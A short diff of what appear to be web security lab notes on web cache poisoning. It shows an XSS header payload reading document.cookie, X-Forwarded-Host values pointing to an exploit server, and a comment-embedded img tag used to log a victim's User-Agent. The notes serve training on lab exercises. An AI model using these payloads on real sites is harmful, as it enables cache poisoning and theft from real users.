@@ -33,7 +33,7 @@ X-Forwarded-Host: a."></script><img src=1 onerror='alert(document.cookie)'>"<scr
   X-Forwarded-Host: exploit_id.exploit-server.net
   X-Forwarded-Scheme: com
 - ==Targeted web cache poisoning using an unknown header== 
-  Post a comment on a blog post: \<img src="https://exploit-id.exploit-server.net" />
+  Post a comment on a blog post:  `<img src="https://exploit-id.exploit-server.net" />`
   View access log to get the User-agent of the victim, and paste this User Agent in the response, e.g.:
   User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
   
